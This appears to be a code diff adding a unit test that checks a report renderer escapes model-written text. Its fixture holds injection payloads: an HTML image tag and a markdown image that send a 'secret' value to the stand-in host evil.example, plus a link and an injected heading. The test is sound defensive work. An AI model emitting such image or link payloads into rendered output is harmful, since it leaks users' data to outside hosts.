@@ -81,6 +81,18 @@ describe("renderCompareReport", () => {
     const text = report([verifiedFinding({ title: "a | b\nc" })] as VerifiedFinding[]);
     expect(text).toContain("a \\| b c");
   });
+
+  it("makes model text inert: no HTML, links, images or new lines", () => {
+    const text = report([
+      verifiedFinding({
+        title: '<img src="https://evil.example/x"> [click](https://evil.example)',
+        question: "Fine?\n# Injected heading\n![leak](https://evil.example/?d=secret)",
+      }),
+    ] as VerifiedFinding[]);
+    expect(text).not.toMatch(/<img|(?<!\\)\]\(https|^# Injected/m);
+    expect(text).toContain('&lt;img src="https://evil.example/x"> \\[click\\](https://evil.example)');
+    expect(text).toContain("1. Fine? # Injected heading !\\[leak\\](https://evil.example/?d=secret)");
+  });
 });
 
 describe("usageLabel", () => {
